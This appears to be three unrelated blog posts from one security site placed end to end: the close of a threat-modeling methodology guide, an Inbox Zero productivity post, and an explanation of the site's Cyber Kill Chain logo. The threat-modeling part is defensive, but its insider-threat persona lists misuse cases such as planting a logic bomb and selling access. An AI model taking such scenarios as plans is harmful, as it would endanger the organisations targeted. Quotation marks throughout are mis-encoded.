Step 1: Identify the target system. hTMM recommends leveraging steps 1-3 of SQUARE to divine business/security goals, assets and system artifacts. Step 2: Brainstorm potential threats and attack vectors using Security Cards. Conduct this exercise with developers, system users and cybersecurity staff. Step 3: Using the output from the Security Cards exercise, filter attack vectors/scenarios based on realistic personas. Step 4: For each identified threat, summarize the finding with the following attributes - actor, purpose, target, action, result of action, impact and threat type (i. e. STRIDE). Step 5: Conduct a formal risk assessment. Thoughts and Observations for hTMMIn this section, I briefly cover a few thoughts and observations after learning more about the hTMM methodology. 25 The primary foundations of hTMM are all threat-related - threat categorization using STRIDE and threat generation using PnG + Security Cards. This is an unsurprising theme amongst most documented threat modeling methodologies. Follow the threats! hTMM emphasizes the importance of early specification of security requirements, as this will have measurable impact for the security of the system architecture later on in the system lifecycle. Unfortunately, the authors continue to proliferate an incorrect understanding that STRIDE is a theat modeling method (a. k. a. ‚ÄúTMM‚Äù), when in fact it is simply a threat categorization tool. No explicit direction is given to create a data flow diagram. Interesting to not build a ‚Äúmodel‚Äù in a ‚Äúthreat modeling‚Äù methodology! At various points, the authors suggest the use of ‚Äútool support‚Äù to facilitate the summarization and analysis of threat findings. At no point though do they really explain what these tools are or offer one of their own. For the record, this guide introduces a wealth of threat modeling tools. Overall, hTMM is pretty barebones and leaves a lot to be interpreted. Its inclusion of Security Cards and PnG is admittedly useful, but not something that is exclusive to this methodology. Security Cards: Security Cards is a threat generation (or ‚ÄúThreat Brainstorming‚Äù, as the authors have referred to it) toolkit, originating from the University of Washington, consisting of 42 distinct ‚Äúthreat‚Äù cards across 4 unique ‚Äúsuits‚Äù (detailed below). 25,27 Human Impact - Describes the impacts that actual humans may experience as a result of a successful attack. Adversary Motivations - Effectively, the ‚Äúintent‚Äù characteristic of a cyber threat. Adversary Resources - As introduced by the Diamond Model in the CTI section, this represents an adversary‚Äôs available infrastructure used to facilitate an attack. Adversary Methods - Consider these the capabilities or TTPs an attacker leverages to conduct an attack. So how are these cards used? Well, the official site for Security Cards provides a number of activities that can be exercised, all in the spirit of threat generation. In the absence of having a large, dedicated security function who has time to allocate appropriate resources to conduct threat modeling, Security Cards serves an alternative way to harness the creativity and brainstorming power of non-security personnel to perform threat generation and modeling instead. This can be particularly effective as you are able to introduce new, wide-ranging perspectives into the threat generation process. Persona Non Grata (PnG): Persona Non Grata (PnG) is a threat generation technique posited by Jane Cleland-Huang during her time as a software engineering professor at DePaul University (~2014). She suggested that we describe potential threat actors as archetypical users of a system that may have mischievous or even explicitly malicious end-goals. By visualizing and describing these personas, the real-world motivations and possible misuse cases (QTMM: Stage 3) of these unwelcome individuals could be developed, which would then help illuminate potential attack vectors and vulnerabilities. 29 The PnG exercise is useful as it gives anyone involved in the development, or securing of a system, the opportunity to think critically about the types of actors that may target a system, the specific goals they may wish to achieve and the actions they would take to achieve those goals. In the absence of reliable threat intelligence, PnG can be a useful mechanism for producing more realistic attack scenarios compared to something like Trike‚Äôs threat generation approach which is to enumerate ALL abuse cases, no matter how realistic. An example persona is described below. 25 Example PnG Threat Persona ‚ÄúJohn‚Äù is a senior developer within your company. He has been with the company for almost 10 years and has been unhappy with recent changes within the engineering organization. His work velocity has notably slowed in recent weeks and has become more visibly disgruntled as a result of recent encounters with new leadership and having received less meaning project assignments. Some misuse cases given Johns persona are as follows‚Ä¶ Baking a logic bomb into enterprise code or systems. Purposefully injecting other forms of malicious code into a production branch. Taking secrets to a competitor. Introducing sloppy code as a result of sheer disinterest. Selling access to corporate infrastructure to an initial access broker. The goals for John could be the following‚Ä¶ ‚ÄúGet back‚Äù at leadership who he disagrees with or those he feels have ‚Äúwronged him‚Äù. Leave the organization and take trade secrets, data or other assets to a competitor. Make money by selling data, secrets or access to the organizations infrastructure. As a skilled developer, John‚Äôs capabilities include‚Ä¶ Strong development and technical prowess. Privileged access to source code repositories, production systems and highly-classified data. Deep institutional knowledge. One of few individuals within the company who understand how certain systems operate and their architecture. Quantitative Threat Modeling (QTMM): A Quantitative Threat Modeling Methodology (QTMM) can be described as a threat modeling methodology that leverages the measurable characteristics of attack tree elements to quantitatively calculate and prioritize the impact and risk of threats to a system. Such a methodology was published by German researchers from the Technische Universitat Darmstadt and Goethe Universitat Frankfurt am Main universities, titled ‚ÄúPrivacy-by-Design Based on Quantitative Threat Modeling‚Äù. This research debuts a privacy-focused variant of quantitative threat modeling and introduces the following novel features. 26 A quantitative methodology designed to systematically elicit both security and privacy requirements, by iteratively tuning the risk associated with identified threats and attacks. A comprehensive set of quantifiable security and privacy (a. k. a. ‚ÄúS&amp;P‚Äù) threats based on the ‚ÄúPrivacy Protection Goals‚Äù (PPGs), which have proved well-suited for qualitatively evaluating risks. A set of rules to quantitatively aggregate into an attack tree the risks associated with individual attacks. The Stages of QTMMQTMM as described by this research is comprised of a 5-stage process which combines STRIDE, PPG and quantifiable attack trees to deliver privacy-by-design (‚ÄúPbD‚Äù) within the early phases of the SDL. These stages are depicted below. 26 Stage 1: Define the DFD - Produce a standard data flow diagram (DFD) of the system. Stage 2: Map DFD to S&amp;P Threats - Map threats to the various elements (e. g. data store, data flow, process, entity) of the created model - for example, by leveraging STRIDE. In addition to the traditional security-related threats, QTMM also presents privacy-specific threats that should also be accommodated within the matrix. An example of such a mapping is provided below. Security Property Threat Explanation DS DF P E Confidentiality Information Disclosure ‚Ä¶ X ¬† X X ‚Ä¶ ‚Ä¶ ‚Ä¶ X X X X Stage 3: Identify Misuse Cases - Misuse cases are documented by capturing the following information - summary / threat description, target asset, misactor description, attack tree, attack preconditions and mitigation mechanisms. This is done in similar fashion to the LINDDUN methodology, which also suggests the formulation of attack trees to visualize these threats. Stage 4: Risk-Based Quantification of Attack Trees - This stage represents the essence of QTMM, the goal of which is to provide a quantitative score for a threat tree based on the aggregate score of its collective attack paths. This particular methodology recommends the use of DREAD to quantitatively score and then prioritize attacks within the tree. For more details on the formulas for performing these calculations, I recommend referencing Section II:D (i. e. , Stage 4: Risk-based Quantification of Attack Trees) of the QTMM research paper. Stage 5: Produce S&amp;P Requirements - Elicit mitigation controls and security requirements to mitigate identified risks. Refine attack trees by re-calculating the risk score given the implementation of the proposed countermeasure. Add new attack paths (as applicable) if the introduction of a security control results in new attack surface. Privacy Protection Goals (PPGs)Privacy Protection Goals (‚ÄúPPGs‚Äù) are the basic set of security properties derived from the EU Data Protection Directive (Directive 95/46/EC). They resemble the LINDDUN threat categories. The PPGs are defined below. 26 Unlinkability: Data processing is conducted such that privacy-relevant data is unlinkable to any other set of privacy-relevant data outside of the domain, or at least that the implementation of such linking would require disproportionate efforts for the entity establishing such linkage. Transparency: All parties involved in any privacy-relevant data processing can comprehend the legal, technical and organizational conditions. Intervenability: The parties involved in any privacy-relevant data processing, including the individual whose personal data is being processed, have the capability to intervene, where necessary. Thoughts on this Version of a QTMM: Below I provide a list of thoughts and observations related to the quantitative threat modeling methodology (QTMM) presented here. Great idea to consider both security and privacy threats while performing threat modeling. How novel! ‚ÄúHow can we make threat modeling more fun?‚Äù. MATH! QTMM suggests the use of the SeaMonster security modeling tool to assist with attack trees and misuse case modeling. Its reliance on a notably flawed model like DREAD is worrisome. That said, swapping DREAD out for a more worthy risk scoring model could take QTMM to the next level. 28ID3: ID3 is a new(ish) threat modeling methodology created by yours truly. So what does ID3 bring to the table that other, more established methodologies don‚Äôt? Nothing really, I just thought it would be cool to come up with my own methodology and give it a cool acronym (and I think I succeeded). Jokes aside, this is in fact the threat modeling recipe I personally use, with influences from some of the other methodologies that have been presented here in this guide. What ID3 brings to the table is a repeatable, scalable methodology that incorporates exactly the elements most useful for my threat modeling style. The high-level steps (and noted influences) for ID3 are presented below. Inventory System Components - Define the technical scope by building a system component inventory. This ends up being a mix of PASTA Stage 2, Phase 2: Process 5 of OCTAVE and OWASP TMP Step 1 (just the component-ID‚Äôing step). 6,13,22 Diagram Architecture - Model the system, creating a DFD for visualization. Here I‚Äôm going with the equivalent of Microsoft‚Äôs ‚ÄúDiagram‚Äù step, or Trike‚Äôs Implementation Model, scratching the laborious use flow generation and holding the security control decomposition until Step 4. This also takes on the ‚ÄúVisual‚Äù quality of VAST. 3,14,17 Identify Threats - Develop a list of realistic threats using a CTI-infused version of Steps 4 + 5 of the IDDIL/ATC Discovery Phase (threat profiles &amp; attack trees optional). I also make sure to include privacy-related threats ala LINDDUN. 15,24 Decompose Application - With sub-systems, data flows and potential threats identified, I begin to decompose the application, generating a list of applicable security controls (i. e. OWASP ASVS), and then applying them as visual overlays at the points where they have effect(s) within the system architecture. For this, I‚Äôm relying on the Trike Implementation Model and Step 3 of NIST‚Äôs Data-Centric TMM. 14,21 While proposing potential controls, I stay mindful of the negative qualities any given control may have on the system or organization (also per Step 3 of NIST‚Äôs Data-Centric TMM). 21 * Note: Steps 3 and 4 could technically be switched here with no meaningful effect on the outcome. If you were to perform step 4 first you might in theory be able to rule out certain threats in the Identify Threats step. By doing this though, you might exclude certain threats without really giving them the proper analysis they deserve in the upcoming step. Illustrate Threats - Leveraging our known technical scope, application decomposition, available CTI and imported attack libraries, I now build/analyze attack scenarios (from PASTA Stage 4), and then perform attack surface analysis and attack tree mapping (both from PASTA Stage 6). The preferred way to illustrate threats alogside the identified controls and system components is to produce an architectural rendering, per the IDDIL/ATC Controls Implementation Step. Once again, this step adheres to the VAST visual principle. 6,17,24 Document Risk - Create a risk-prioritized list of findings based on probabilistic attack scenarios, expected impacts and the understanding of what defensive controls are in place. A simple risk-scoring system such as CVSS may be used here. This step of ID3 is going to most resemble PASTA Stage 7, just with simplified inputs and outputs. I also remember to re-factor the risk of threats based on the proposed countermeasures, similar to what is described in Stage 4 of QTMM. 6,26So there ya have it! ID3. Future Methodologies: In future updates to this guide, I will be detailing additional methodologies. A list of upcoming models is included below! INCLUDES NO DIRT 32 CTM 33 KTH TMM 34 VerSprite OTM 35 Penetration Testing Execution Standard (PTES) 36 EMB3DModeling Exercise* Note: In future updates to this guide, I will provide a step-by-step walkthrough of one or more of the Threat Modeling methodologies from this guide. Stay Tuned! ConclusionI had a lot of fun, and learned a great deal while building this guide out. I want to thank all of those involved developing the previous research, blog posts and assorted guidance-from-the-Internet I benefited from while putting this all together. Listed below are a few considerations and final parting thoughts related to threat modeling. Don‚Äôt forget to perform threat modeling early on in the system development lifecycle and then continuously as the system evolves. Threat modeling can be somewhat of an opaque subject which can make the barrier to entry seem high. I hope with this guide, the steps (whichever you choose to take) become clear and thus the path to threat modeling becomes easier. Many of the threat modeling methodologies covered in this guide are very prescriptive, formalized or just plain involved. This can be overwhelming to the point where you don‚Äôt even bother attempting to threat model because you won‚Äôt be able to succeed in a by-the-book approach. Try to focus less on doing every. single. thing. that these methodologies describe and more on what you can do to help better highlight the risks within a system. That‚Äôs exactly what I did with ID3! I just cherry-picked the things I liked from different models, smushed them together, slapped a shiny new name on it and went on my merry way. In other words, don‚Äôt let perfection be the enemy of good. Threat modeling is (and should be) highly collaborative. You‚Äôre going to need help. Use this time to build relationships across the business, learn in a cross-disciplinary fashion and of course, have fun! Each of the threat modeling methodologies covered in this doc have a context in which they shine. You may find that at different organizations or at different moments in time within a single organization, one methodology will prove superior to another. What I‚Äôm trying to say is, keep a working knowledge of all of them, you never know when you‚Äôll want to use one over another. ‚ÄúThe Enchiridion of Impetus Exemplar‚Äù, loosely translated from Latin means ‚ÄúThe Manual of Attack Model‚Äù. It sounds better in Latin‚Ä¶ AppendicesData Flow Diagram: Data Flow Diagrams (DFDs) are more art than science, in fact, they are drawings much like art! There is however some science to DFDs, especially in the context of threat modeling. The following key should help you decipher the elements within the DFD I have provided, as well as other DFDs which use this common symbology. 4 Rounded Rectangle - External process/entity Circle - Internal process Arrow - Directional data flow Partial Rectangle (parallel horizontal lines) - Data store Rectangle - External entity (out of our control sphere) Dotted Line - Trust boundaryThe DFD you see below is a (admittedly poor) visualization / model of the shellsharks site. As I mentioned earlier, this is but one way to create a DFD for a threat modeling exercise. For another take, check out this awesome threat model DFD from Synopsys! * Note: I‚Äôm planning on adding a much better DFD in future developments to this guide - more akin to the Synopsys one. Stay tuned! Threat Modeling Methodology Matrix (TM3): * Note: In future updates to this guide, I plan on adding a comprehensive matrix (dubbed, ‚ÄúTM3‚Äù), mapping the characteristics &amp; capabilities of all methodologies within this guide. This matrix will be reminiscent of the comparison table sourced from the ThreatModeler site. 17 Tooling: There are a number of tools built for (or can be used for) threat modeling. Listed below are some of these tools. 19 Microsoft Threat Modeling Tool - Leverages STRIDE to categorize threats and simplify security conversations. OWASP Threat Dragon - Supports STRIDE &amp; LINDDUN. ThreatModeler (commerical) pytm Trike Draw. io - Not specifically a threat modeling tool but can be used to create threat models anyways. Threagile - Open-source toolkit which enables teams to execute Agile threat modeling.

In Part One, I introduced the concept of Inbox Zero (specifically, my flavor of it) and enumerated the steps I take to zero-out my inbox day-to-day. In this follow-up, I will cover some of the specific, practical mechanics of how I execute my Inbox Zero playbook. I also provide the scientific basis in which this methodology has a very real, positive psychological effect, improving efficiency, productivity and happiness. Jump to Section Practical Mechanics Email Process(ing) Flow Psychology References*A shoutout to my wife, for which I owe my inspiration for doing this research and writing this post. I‚Äôll convert you one way or another! Practical MechanicsIn my previous post on Inbox Zero, I introduce a number of concepts and steps for zeroing out an inbox, but notably absent are some of the specifics on how I actually do it. In this section, I cover the tooling, procedures and other variables I use to churn through my email. In the sections below, I cover a variety of techniques, specifics and examples for steps 3 (Take Action), 4 (Save For Later) and 5/6 (Archive/Delete) of my previously detailed zeroing-out methodology. Steps 1 (Unsubscribe) and 2 (Consume) are pretty simple so I really don‚Äôt have anything else of substance to add. Taking ActionTo succeed with Inbox Zero, it is crucial to attack emails with a very action-oriented mindset. Email can not be allowed to live rent-free in your inbox or in your head. If we‚Äôre not unsubscribing, easily-consuming, archiving or deleting email right away it‚Äôs important to ask ourselves, ‚Äúwhat needs to be done to complete this email‚Äù. Some techniques I employ are described below‚Ä¶ Augment your inbox with a to-do system: Riding side-saddle to my inbox, I rely on my trusty to-do app to help me remember and prioritize items. Email apps are very ineffective to-do apps 1 and thus shouldn‚Äôt be used as one, but your inbox does generate a lot of to-do‚Äôs! Naturally then, it makes sense to create a ‚Äúto-do‚Äù for respective items in your inbox. By doing this, you can move an email out of your main inbox and into an appropriate folder, whether that be the ‚ÄúFor Later‚Äù folder 2 or somewhere else. With a stub for that email now in your to-do app, you can safely have it out of your inbox and take care of it based on your own to-do methodology (more on this later 11). As an example, let‚Äôs say you get an email from your dentist, reminding you to schedule your six-month cleaning. Rather than leaving it in the inbox, I would create an item in my to-do app with a subject such as ‚Äúschedule 6-month dentist appointment‚Äù, then I‚Äôd delete the email! If there is information in the email I need to help schedule the appointment, I could instead move the email to the ‚ÄúFor Later‚Äù folder rather than deleting it. Once I‚Äôve completed the task, I could then go back into that folder and delete it for good. I personally take this approach to a particular extreme. For emails that require a substantive task to be completed (i. e. not just consuming information), I will often create a to-do, even if I can complete it right away! The very act of creating the to-do and then marking it as complete has a psychologically-positive effect. Checking things off, no matter how small, can help build productive momentum 12. Just be sure to not overdo it here as creating endless tiny to-dos would certainly introduce counter-productive overhead when done at scale. Stars and flags: Email systems usually have the concept of starring or flagging an email as a way to denote its relative importance. If you follow the guidance from the previous bullet (creating to-do‚Äôs associated with emails and tackling them that way) then you technically don‚Äôt really need to utilize stars/flags as you would be taking things out of email and prioritizing them in your to-do system instead. With that said, I still star things in my email app as it does add that extra bit of emphasis and urgency for certain emails that I know I need to get to. The power of delegation: Delegation is an under-utilized action in the world of people‚Äôs personal email (and to-do methodologies in general). There is plenty of email I receive that in order to fully ‚Äútake action‚Äù on it, there is a dependency on someone else. As an example, I may get an email about picking something up from the store but need to coordinate with my wife on when to go. In this case, the dependency is getting a response from my wife about it. Here I could forward the email to my wife (or text her), suggesting a time for me to go pick it up. Now I can move this email to ‚ÄúFor Later‚Äù as it doesn‚Äôt require any additional action from me. Further, I can create a task in my to-do with a subject such as ‚Äúpick up the thing from the store‚Äù. Here I took decisive action on the email, I progressed the task and most importantly, I got one email closer to Inbox Zero! Inbox checking frequency: This is entirely up to you and really just depends on your own philosophy around ‚Äúdisconnecting‚Äù. With that said, depending on the volume of email you receive, I recommend checking it somewhat frequently in order to be able to process it in smaller chunks. (More on this later. ) Saving for LaterOK, so as we have seen in the previous section, a lot of what ‚Äútaking action‚Äù means in reality is in fact not taking immediate action but rather storing the respective item for action at a later date. There are a few techniques I use for this. You can use one or more of these simultaneously to help stay on top of what you need to do while also keeping that inbox shiny and clean. The enigmatic ‚ÄúFor Later‚Äù folder: I put a fair amount of things in my notorious ‚ÄúFor Later‚Äù folder 2 - and for a variety of reasons. One could argue, ‚Äúwhy is having a bunch of stuff in a separate For Later folder better than just keeping it in your inbox?‚Äù I‚Äôll cover the psychological benefits of this concept later, but let me start with explaining the more mechanical benefits. It‚Äôs undeniable that there is some amount of time required to mentally process/initially-triage emails within your inbox. As you work through your inbox - deleting, archiving, consuming, whatever - you spend some time on each. By leaving an email in your inbox (rather than taking an action that would remove it from your inbox), you open yourself up to having to mentally re-assess that item as it now lies adjacent to a new (or otherwise un-processed) email that actually requires fresh review. Rather than forcing yourself to reassess these emails each and every time you check your inbox, simply move them to the ‚ÄúFor Later‚Äù folder and then review that folder at a less-frequent cadence (more on this interval below!) ‚ÄúFor Later‚Äù folder checking frequency: OK, so let‚Äôs say we are moving things into the ‚ÄúFor Later‚Äù folder - how often should we then consult this folder? Ultimately, I believe this would vary from person to person and it in some ways depends on the frequency in which someone generally checks their inbox. I check my inbox multiple times daily, but I only check ‚ÄúFor Later‚Äù every couple of days at most. Here you can immediately see the time savings as I am not needing to review these each and every time I check my inbox! The idea here is to check it at a much less frequent interval. If you find yourself checking it often and generally taking no actions, you can probably check it less frequently! With all this said, there‚Äôs an even better way to deal with most ‚ÄúFor Later‚Äù items. (Check out the next bullet!) For Later triggers: Once we start sticking lots of things in ‚ÄúFor Later‚Äù rather than keeping them in the inbox, we could really benefit from a system that helps us remember to review those items while also not necessitating needless checking of each email in that folder when no action is yet needed. So how do we achieve this? Well, in a few ways! We previously covered creating corresponding to-do tasks for emails in the taking action section. If you are leveraging this technique, you can close out ‚ÄúFor Later‚Äù email items at the same time you close out to-do items based on your chosen to-do methodology. Sweet! As another example, let‚Äôs say you have a ‚ÄúFor Later‚Äù email for a delivery you are expecting that you want to make sure you receive. In this case, I have a delivery tracking app that monitors the progress of my delivery. Once I receive it, I can archive/delete that email in my ‚ÄúFor Later‚Äù box. Essentially, the idea behind the majority of ‚ÄúFor Later‚Äù items is that there should be an external trigger that fires, reminding you to consult the ‚ÄúFor Later‚Äù box and ‚Äúclose out‚Äù or make progress towards closure, of the email item. When to take substantive action: How do I decide whether to take substantive action vs setting it aside for later? I don‚Äôt think there is a real amount-of-time threshold for how I decide when to deal with things (the ‚ÄúTwo Minute Rule‚Äù 10 we will discuss later pegs the threshold at, you guessed it! - 2 minutes). For me, this is more of a, what do I feel like doing right now or what do I have time to do right now question. 11 Don‚Äôt leave things in your inbox you will never get to! This is a simple axiom. Just get rid of it! (or archive somewhere) What actually ends up in the ‚ÄúFor Later‚Äù folder?: This will vary person to person, but for me it‚Äôs things like tracking number emails, online order confirmations, future travel artifacts/events (e. g. flight/excursion confirmations), assorted to-do‚Äôs (that of course have corresponding records in my to-do app), and really any other item that I know I want to get to eventually but don‚Äôt really care when. When do I leave things in the inbox?: In some cases, I leave things in my inbox rather than moving to the ‚ÄúFor Later‚Äù folder after triaging. What?? Isn‚Äôt that contrary to what I suggested earlier? Kinda, but let me explain‚Ä¶ I detailed earlier how items that make their way into the ‚ÄúFor Later‚Äù folder are typically tied to a to-do or some other external trigger. Well if there is an item that doesn‚Äôt have a trigger, or a to-do, and needs to be addressed in relatively short-order, I will sometimes decide to just leave it in my inbox. Alternatively, for items that I want to constantly remind myself of, I leave it in the inbox as my eyes will continually be drawn to it each and every time I check my email. Snoozing: One feature that a lot of email providers have adopted is ‚ÄúSnooze‚Äù. This is a very easy way to move an item for later based on a chosen time-delay. I use this in cases where I know I need to check in on something at a particular date and don‚Äôt want to create a to-do for it instead. Archival vs DeletionI wanted to provide a quick (list driven, of course) process flow related to steps 5/6 from my high-level zero-out playbook. Once you‚Äôve taken all non-storage/deletion-related actions on an email, follow the following steps for processing. Do you need this email? No? Delete. Yes? Go to Step 2. Do I have an existing folder/label that I can archive this email into? Yes? Put email in that folder. No? Go to Step 3. Does it make sense to create a new folder for emails of this type? Yes? Create folder, archive email into the new folder. No? Generically archive it rather than deleting it. The idea behind the final flow of Step 3 is that we can archive things ‚Äúgenerically‚Äù so that we can search for and find things later. By doing so, we do not introduce unnecessary clutter into another folder/label nor will we necessitate the creation of a new folder/label that will never have much in it. Nice! Email Process(ing) Flow: To help illustrate the overall process flow of how I process my email, I‚Äôve developed the following diagram. PsychologyAlright, assuming you read the previous section, you now know WAY more about my e-mail processing workflow than any normal human should. Let‚Äôs now get into why managing your email in this way is good for you straight-up emotionally. This section will introduce a variety of semi-isolated topics, associating well and independently researched scientific studies with the relevant qualities of ‚ÄúInbox Zero‚Äù. Buckle up! If a cluttered desk inbox is a sign of cluttered mind, of what, then, is an organized desk inbox a sign? 3 You may be familiar with Marie Kondo‚Äôs KonMari method for organization, the main principle being you keep only those things that ‚Äúspark joy‚Äù. I don‚Äôt recommend following this exactly in the context of your email (as there is plenty of email I need that doesn‚Äôt quite spark joy) but I think the underlying thought here makes sense. Keep only what you need (or of course, enjoy). For everything else, delete or unsubscribe! In this way, you can transform and then live your (digital) life the way you want. The second tenant of the KonMari method is to ensure everything has a place to go. In the context of your email, this means for things you do want to keep, make sure they are filed away in an appropriate place. Essentially, this is digital house-keeping. Collectively, this methodology promotes mindfulness, introspection and an eye towards the future. 4 A 2011 Princeton study titled ‚ÄúInteractions of Top-Down and Bottom-Up Mechanisms in Human Visual Cortex‚Äù 5 (inhales) explains how clutter impairs focus, thus making it more difficult to complete tasks efficiently. I won‚Äôt regurgitate the rather complex science introduced by the research, but what I can say is that when applied to how one might review/process their email, it would follow that by actively reducing the amount of items in your inbox, you can maintain an environment (one with less overall emails) that is scientifically better suited for efficiency/productivity. In other words, even if you can‚Äôt achieve truly 0 emails (effectively, Inbox Zero), the sheer fact that you have very few emails in your inbox promotes a more effective working environment. A Dutch study from 2017 titled ‚ÄúImpact of cleanliness on the productivity of employees‚Äù 6 investigates the correlation between cleanliness and productivity. Unsurprisingly, it was found that cleanliness significantly increased perceived productivity and general work satisfaction. This follows with the previously mentioned research 5 - having a clean or otherwise organized environment (whatever that may be) fosters productivity and efficiency! Traditional wisdom suggests that having an organized workstation helps promote productivity. Given our reliance on email as a primary means in which we collaborate and work, it makes sense for us to keep our inbox and other respective email folders clean and tidy. To wrap up the theme of organization &amp; cleanliness and how it applies to email, consider some of the following statistics on Organizing &amp; Time Management gathered by the author of the blog Simply Productive. These stats lay bare the cost of clutter and disorganization. One stat describes the amount of time (~150 hours/year) wasted searching for lost information. The National Association of Professional Organizers (NAPO) even claims that on average, we spend one year of our lives looking for lost items. With a properly pruned and sorted email system, you can significantly reduce the time it takes to find things in your email! Email is increasing in print volume by 40%! This is why ruthlessly unsubscribing is one of the more powerful tools at your disposal. Using proper organization tools can improve time management by almost 40%. Inbox Zero, to-do lists, and all the other tactics described in this series can be certainly be considered as some of these tools. The benefits of being organized don‚Äôt end with increased productivity though, there is also very compelling science which points to its stress-reduction qualities as well! In one study, titled ‚ÄúNo place like home: home tours correlate with daily patterns of mood and cortisol‚Ä¶‚Äù 7 ( ), the researchers identified a correlation between how individuals described their home, and the severity of depressed mood they experienced. In this experiment, even recounting the general cleanliness/organizational-state of their home proved to be stressful (when the individuals in fact had cluttered homes). What I take away is that people who strive to, and succeed in maintaining an acceptable level of organization/cleanliness will in turn be less stressed! This idea is enforced by a subsequent study, ‚ÄúThe dark side of home: Assessing possession ‚Äòclutter‚Äô on subjective well-being‚Äù 8, which concludes that clutter has a negative impact on the psychological home and subjective well-being. This is due to our inherent need to identify self with our physical environment, of which a messy or cluttered one does not reflect well. Put it all together and one could surmise that messiness in general, whether it be in an inbox or in the home, can introduce unwanted stress. Saving time - which can be achieved through improved efficiency, has been proven to reduce/prevent stress. 9 So we now have the basis for how organization and cleanliness can improve productivity, efficiency and even reduce stress. Let‚Äôs talk about how we apply the psychology of task management / GTD 11 in the context of Inbox Zero‚Ä¶ Let‚Äôs start with the ‚ÄúTwo Minute Rule‚Äù 10, first introduced by David Allen in ‚ÄúGetting Things Done‚Äù. The rule simply states, ‚ÄúIf you can complete a task in less than two minutes, you should just do it. ‚Äù This is a core tenant of the Inbox Zero methodology. Look, no one loves procrastinating more than me, but by just doing it, you can clear things out of the inbox (reducing clutter) and start building productive momentum 12 by completing the micro-tasks that these emails represent. 13 At the end of the day, an inbox is really just a list of things to do (e. g. read, delete, archive, etc‚Ä¶). A lot of peoples inboxes are PACKED, with 10‚Äôs, 100‚Äôs, even 1000‚Äôs+ of emails. This is naturally a bit overwhelming. Well David Allen is back with some really great advice on how to leverage a GTD philosophy to mentally tackle a large list of to-dos. He condenses the complexities of every day task prioritization into three separate dynamics - limitations, adaptability &amp; life purpose. E. J. Masicampo, a Psychology professor at Wake Forest University, has documented research examining the relationship between having too many ‚Äúgoals‚Äù activated within one‚Äôs environment and how that constrains mental faculties. In the context of email / lists in general, he essentially postulates that by having too many visible to-dos (or things on your list) at one time you compromise your mental effectiveness. He goes on to say that attention can be freed by satisfying ‚Äúactive goals‚Äù, such as through plan making or goal completion. One way in which to ‚Äúmake plans‚Äù in this context, and in the world of Inbox Zero, is to decompose a more complex task (originating in this case from an email) by creating a series of micro-tasks 13, thus devising a plan to complete the overall task. The ‚ÄúZeigarnik Effect‚Äù states that ‚Äúpeople tend to remember unfinished or incomplete tasks better than completed tasks‚Äù. This model suggests a key to overcoming procrastination is to simply, just get started. So by leveraging something like the Two Minute Rule 10, we can psychologically build productive momentum. Further, the Zeigarnik Effect suggests that mental health improvements can be achieved by A. NOT having incomplete items languishing in your to-do list and relatedly, B. the sense of accomplishment you get by completing tasks. 13 In fact, it‚Äôs well understood that when we humans check things off, our brains release dopamine that in turn makes us feel, amazing. That satisfaction and sense of accomplishment can have a snowball effect, motivating us to continue completing even more tasks. By leveraging this simple psychology, we can overcome procrastination by starting small and working our way towards larger and larger tasks. Where a task may be too large and intimidating to begin, consider breaking it into smaller, more atomic micro-tasks, each of which is more easily individually digestable. A word of warning!: While leveraging to-do lists and GTD 11 methodologies has a lot of practical utility, be weary of over-generating to-dos in the name of micro-task-completing 13. This is the way towards developing an OCD complex. OutroAt the end of the day, how and what you do with your email is somewhat personal and what‚Äôs ‚Äúbest‚Äù for one person will not necessarily be the same for someone else. If you are drowning in email or like the idea of Inbox Zero, consider this slightly tweaked approach!

Ok, so I realize it‚Äôs less of a logo and more of a complicated graphic I use as the ‚Äúsplash screen‚Äù of sorts for the site. I understand that logos, generally speaking, are far simpler and this is anything but. In any case‚Ä¶ let‚Äôs get into it! Inner SpaceI like to think of the logo in terms of two distinct regions, the ‚ÄúInner Space‚Äù which houses the 7 individual smaller circular symbols and the ‚ÄúOuter Space‚Äù which is essentially the large red ring with the 3 sharks, QR code and ring of binary characters. The Cyber Kill Chain: The primary inspiration for the symbology in the Inner Space is Lockheed Martin‚Äôs Cyber Kill Chain. Though I know this model has been somewhat deprecated in favor of newer frameworks such as MITRE ATT&amp;CK, I still think the Kill Chain has valuable (albeit more simplistic) applicability. Also, capturing ATT&amp;CK in a graphic similar to the existing one would be even more insanely complex! Shellsharks Logo Symbology: Let‚Äôs walkthrough the sequence of 7 symbols and how they visually represent each phase of the Kill Chain. (Note: You may need to zoom in on the individual icons as we go). Reconnaissance: Starting on the left, we see a variety of satellites, satellite dishes and cameras all pointing towards the center circle. This represents reconnaissance performed against the target which is, again represented by the center icon. Note how the reconnaissance logo is the first one the sharks on the left are swimming to, which is meant to signify that it is the first step for the attacker (i. e. the sharks). Weaponization: The second circle represents weaponization. As such, I've put a lot of weapon-related icons (e. g. swords, arrows) and military-invoking visuals into the icon. Delivery: Here we can see a rocket launch, simply depicting payload delivery. Exploitation: There is quite a bit of symbology going on in this icon. We have the exploit chain (meant to look like 1's and 0's) going around the outside portion of the circle. There is a computer with a kraken on it (meant to just be menacing). We are running our exploit (on a Unix-based machine presumably) via . /exploit. Finally, we have a soup of 1's and 0's interspersed and spilling out of the logo into the following phase. Installation: Here we see the stream of 1's and 0's from our exploitation phase being piped into the victim computer. The computer has a downward arrow to very plainly represent installation of malicious code. Command &amp; Control (C2): This icon depicts a terminal interacting with a seemingly remote installation (i. e. one on a distant planet). This particular icon I've always really loved as it reminds me of the Endor shield generator dish from Return of the Jedi. Actions on Objectives: Finally, we have the Actions on Objectives icon. Here we see a road to a building that's meant to be Capitol-esque with fireworks and the letters DC01 above it. The idea here is that the objective was to capture the DC (i. e. Domain Controller). Basic, I know right? Outer SpaceNow we blast into Outer Space (the area of the logo which contains the sharks, QR code and enciphered binary ring)‚Ä¶ Sharks: Threat actors, hackers, red teamers, etc‚Ä¶ QR: Scan it (or click) and find out!

